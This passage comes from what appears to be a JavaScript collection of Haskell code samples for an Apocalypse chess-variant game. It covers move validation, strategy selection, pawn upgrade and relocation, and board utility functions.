		    | srcY < 0 || srcY > 4 = False
		    | destX < 0 || destX > 4 = False
		    | destY < 0 || destY > 4 = False
		    | otherwise = True

		-- | Returns whether that given move on the board is valid for player
		validMove :: [[Cell]] -> (Int, Int) -> (Int, Int) -> Player -> Bool
		validMove board (srcX, srcY) (destX, destY) player
		    | validMoveBounds (srcX, srcY) (destX, destY) == False = False -- Ensure the bounds are valid (human handles this for us, but whatever)
		    | isPawn == False && isKnight == False = False -- Ensure it is a pawn or knight
		    | ownsPiece board (srcX, srcY) player == False = False -- Ensure they own the piece they're moving
		    | ownsPiece board (destX, destY) player == True = False -- Ensure the piece destination is a tile they don't have a piece in
		    | isPawn && validPawnDirection board (srcX, srcY) (destX, destY) player == True = True -- If it is a pawn, check if it is a valid direction
		    | isKnight && validKnightDirection board (srcX, srcY) (destX, destY) player == True = True -- If it is a knight, check if it is a valid direction
		    | otherwise = False
		    where 
		        srcCell = getFromBoard board (srcX, srcY)
		        destCell = getFromBoard board (destX, destY)
		        isPawn = srcCell == WP || srcCell == BP
		        isKnight = srcCell == WK || srcCell == BK

		-- | Parses and returns the proper Played var (Only works for standard moves -ex. Not pawn placements or whatever)
		parseNormalMove :: Player -> Maybe [(Int, Int)] -> GameState -> Played
		parseNormalMove player move state
		    | isNothing move = Passed
		    | validMove board (srcX, srcY) (destX, destY) player == False = Goofed ((srcX, srcY), (destX, destY)) -- Ensure the move is valid
		    | otherwise = Played ((srcX, srcY), (destX, destY))
		    where 
		        board = theBoard state
		        justMove = fromJust move
		        srcX = fst (justMove!!0)
		        srcY = snd (justMove!!0)
		        destX = fst (justMove!!1)
		        destY = snd (justMove!!1)

		-- | Returns a bool as to whether the given pawn relocation move is valid
		validRelocationMove :: Maybe [(Int, Int)] -> GameState -> Bool
		validRelocationMove move gs
		    | isNothing move = False
		    | destCell == E = True
		    | otherwise = False
		    where 
		        board = theBoard gs
		        justMove = fromJust move
		        destX = fst (justMove!!0)
		        destY = snd (justMove!!0)
		        destCell = getFromBoard board (destX, destY)`
	},
	hs10: {
		type: 'haskell',
		code: `
		module StrategyUtils where

		import ApocTools
		import ApocStrategyHumanSol
		import RandomAI
		import GreedyAI

		-- | Only human is necessary for now, but we need two other AI strategies
		strategies = ["human", "random", "greedy"]

		-- | Prints possible strategies in console
		showStrategies = do
		  putStrLn "Possible strategies:"
		  mapM_ showStrategy strategies

		-- | Prints the strategy with proper formatting in console
		showStrategy :: String -> IO ()
		showStrategy x = do
		  putStrLn ("  " ++ x)

		-- | Returns whether both strategies are valid
		stratsValid :: String -> String -> Bool
		stratsValid strat1 strat2
		  | stratValid strat1 && stratValid strat2 = True
		  | otherwise = False

		-- | Returns whether the strat is valid
		stratValid :: String -> Bool
		stratValid strat
		  | strat \`elem\` strategies = True
		  | otherwise = False

		-- | Given a strategy string, returns the strategy function
		getStrategyFromString :: String -> Chooser
		getStrategyFromString strat
		  | strat == "human" = human
		  | strat == "random" = randomMove
		  | strat == "greedy" = greedyMove

		-- | Prompts the user 
		getStrategyForPlayer x = do
		  putStrLn ("Enter the strategy for " ++ x ++ ":")
		  strat <- getLine
		  return strat`
	},
	hs11: {
		type: 'haskell',
		code: `
		module Upgrade where

		import Data.Maybe (fromJust, isNothing)
		import ApocTools
		import Utils
		import Moves
		import Rules

		-- | Given a GameState with recent moves, performs necessary pawn upgrades and relocation
		upgrade :: GameState -> Chooser -> Chooser -> IO (Maybe GameState)
		upgrade gs blackstrat whitestrat = do
		    if (blNeedUpgrade && whNeedUpgrade) then do
		        newgs <- upgradeBoth gs blackstrat whitestrat
		        return (Just newgs)
		    else do
		        if (blNeedUpgrade) then do -- Execute black if possible
		            newgs <- upgradeSingle whiteClearPlay Black blackstrat
		            return (Just newgs)
		        else do
		            if (whNeedUpgrade) then do -- Execute white if possible
		                newgs <- upgradeSingle blackClearPlay White whitestrat
		                return (Just newgs)
		            else do
		                return Nothing
		    where
		        board           = theBoard gs

		        isBlPlay        = isPlayed $ blackPlay gs
		        blDest          = snd $ fromPlayed $ blackPlay gs
		        blDestY         = snd blDest
		        blDestPiece     = getFromBoard board blDest
		        blNeedUpgrade   = isBlPlay && blDestY == 0 && blDestPiece == BP

		        isWhPlay        = isPlayed $ whitePlay gs
		        whDest          = snd $ fromPlayed $ whitePlay gs
		        whDestY         = snd whDest
		        whDestPiece     = getFromBoard board whDest
		        whNeedUpgrade   = isWhPlay && whDestY == 4 && whDestPiece == WP

		        blackClearPlay  = gs {blackPlay = None}
		        whiteClearPlay  = gs {whitePlay = None}

		-- | Upgrades both moves on the GameState
		upgradeBoth :: GameState -> Chooser -> Chooser -> IO GameState
		upgradeBoth gs blackstrat whitestrat = do
		    firstUpgrade <- upgradeSingle gs Black blackstrat
		    secondUpgrade <- upgradeSingle firstUpgrade White whitestrat

		    return secondUpgrade

		-- | Prompts for relocation on the GameState for the given Player and returns the updated state
		relocationPrompt :: GameState -> Player -> Chooser -> IO GameState
		relocationPrompt gs player strat = do
		    move <- strat gs PawnPlacement player


		    if move /= Nothing && player == White then do
		        let moveCoords = (whiteDest, fromJust move!!0)

		        if validRelocationMove move gs then do
		            let newBoard = moveUpgradePiece board moveCoords
		            return (gs {whitePlay = PlacedPawn moveCoords, theBoard = newBoard})
		        else do
		            return (gs {whitePlay = BadPlacedPawn moveCoords, whitePen = (whitePen gs) + 1})
		    else do
		        if move /= Nothing then do
		            -- Must be black
		            let moveCoords = (blackDest, fromJust move!!0)

		            if validRelocationMove move gs then do
		                let newBoard = moveUpgradePiece board moveCoords
		                return (gs {blackPlay = PlacedPawn moveCoords, theBoard = newBoard})
		            else do
		                return (gs {blackPlay = BadPlacedPawn moveCoords, blackPen = (blackPen gs) + 1})
		        else do
		            if player == White then do
		                return (gs {whitePlay = NullPlacedPawn, whitePen = (whitePen gs) + 1})
		            else do
		                return (gs {blackPlay = NullPlacedPawn, blackPen = (blackPen gs) + 1})
		    where
		        board       = theBoard gs

		        whiteCoords = fromPlayed (whitePlay gs)
		        whiteDest   = snd whiteCoords

		        blackCoords = fromPlayed (blackPlay gs)
		        blackDest   = snd blackCoords

		-- | Upgrades a single move for the player on the GameState, and returns the resultant state
		upgradeSingle :: GameState -> Player -> Chooser -> IO GameState
		upgradeSingle gs player strat = do
		    if (player == Black && blDestY == 0 && blDestPiece == BP) then do
		        if (elemCountMulti BK board < 2) then do
		            return blackToKnight
		        else do
		            prompt <- blackPrompt
		            return prompt
		    else do
		        if (player == White && whDestY == 4 && whDestPiece == WP) then do
		            if (elemCountMulti WK board < 2) then do
		                return whiteToKnight
		            else do
		                prompt <- whitePrompt
		                return prompt
		        else do
		            return gs
		    where
		        whDest          = snd $ fromPlayed $ whitePlay gs
		        whDestY         = snd whDest
		        whDestPiece     = getFromBoard board whDest
		        blDest          = snd $ fromPlayed $ blackPlay gs
		        blDestY         = snd blDest
		        blDestPiece     = getFromBoard board blDest
		        board           = theBoard gs
		        blackToKnight   = gs {theBoard = (replace2 board blDest BK), blackPlay = UpgradedPawn2Knight (blDest)}
		        whiteToKnight   = gs {theBoard = (replace2 board whDest WK), whitePlay = UpgradedPawn2Knight (whDest)}
		        whitePrompt     = relocationPrompt gs White strat
		        blackPrompt     = relocationPrompt gs Black strat`
	},
	hs12: {
		type: 'haskell',
		code: `
		module Utils where

		import ApocTools
		import Rules

		---2D list utility functions-------------------------------------------------------

		-- | Replaces the nth element in a row with a new element.
		replace         :: [a] -> Int -> a -> [a]
		replace xs n elem = let (ys,zs) = splitAt n xs
		                     in (if null zs then (if null ys then [] else init ys) else ys)
		                        ++ [elem]
		                        ++ (if null zs then [] else tail zs)

		-- | Replaces the (x,y)th element in a list of lists with a new element.
		replace2        :: [[a]] -> (Int,Int) -> a -> [[a]]
		replace2 xs (x,y) elem = replace xs y (replace (xs !! y) x elem)

		-- | Returns the amount of elements == a in the list
		elemCount :: Eq a => a -> [a] -> Int
		elemCount elem a = length (filter (==elem) a)

		-- | Returns the amount of elements == a in the 2 dimensional list
		elemCountMulti :: Eq a => a -> [[a]] -> Int
		elemCountMulti _ [] = 0
		elemCountMulti elem (x:xs) = elemCount elem x + elemCountMulti elem xs

		-- | Converts a Played data type to a regular (src, dest) tuple
		fromPlayed :: Played -> ((Int, Int), (Int, Int))
		fromPlayed (Played ((srcX, srcY), (destX, destY))) = ((srcX, srcY), (destX, destY))


		-- AI Utility Functions

		-- | Offsets for black pawn moves
		pawnBlackMoves = [(0, -1), (-1, -1), (1, -1)]

		-- | Offsets for white pawn moves
		pawnWhiteMoves = [(0, 1), (-1, 1), (1, 1)]

		-- | Offsets for knight moves
		knightMoves = [(1, 2), (1, -2), (-1, -2), (-1, 2), (2, 1), (-2, 1), (2, -1), (-2, -1)]

		-- | Returns the possible moves for a given piece
		getPieceMoves :: Board -> (Int, Int) -> [(Int, Int)] -> Player -> [((Int, Int), (Int, Int))]
		getPieceMoves _ _ [] _ = []
		getPieceMoves board coord possible@(x:xs) player = 
		    if validMove board (xCoord, yCoord) (xCoord+xOffset, yCoord+yOffset) player then
		        ((xCoord, yCoord), (xCoord+xOffset, yCoord+yOffset)):[] ++ getPieceMoves board coord xs player
		    else
		        getPieceMoves board coord xs player
		    where
		        xCoord = fst coord
		        yCoord = snd coord
		        xOffset = fst x
		        yOffset = snd x

		-- | Returns move offets for a given piece
		getMovesForPiece :: Cell -> [(Int, Int)]
		getMovesForPiece WP = pawnWhiteMoves
		getMovesForPiece BP = pawnBlackMoves
		getMovesForPiece WK = knightMoves
		getMovesForPiece BK = knightMoves
		getMovesForPiece E  = []

		-- | Gets possible moves for board (starting with (Int, Int))
		getPossibleMoves :: Board -> (Int, Int) -> Player -> IO ([((Int, Int), (Int, Int))])
		getPossibleMoves _ (0, 5) _ = do return []
		getPossibleMoves board (x, y) player = do
		    let newCoord = (if x == 4 then 0 else x+1, if x == 4 then y+1 else y)

		    nextMoves <- getPossibleMoves board newCoord player

		    if ownedByPlayer then do
		        let offsets = getMovesForPiece cell
		        return (getPieceMoves board (x, y) offsets player ++ nextMoves)
		    else do
		        return nextMoves

		    where
		        cell = getFromBoard board (x, y)
		        ownedByPlayer = cell /= E && playerOf (pieceOf (cell)) == player
		        isKnight = cell == WK || cell == BK
		        isPawn = cell == WP || cell == BP

		-- | Returns all of the empty cell coords
		getAllEmptyCoords :: Board -> (Int, Int) -> IO ([(Int, Int)])
		getAllEmptyCoords _ (0, 5) = do return []
		getAllEmptyCoords board (x, y) = do
		    let newCoord = (if x == 4 then 0 else x+1, if x == 4 then y+1 else y)

		    next <- getAllEmptyCoords board newCoord
		    if cell == E then do
		        return ((x, y):[] ++ next)
		    else do
		        return (next)
		    where
		        cell = getFromBoard board (x, y)`
	}
}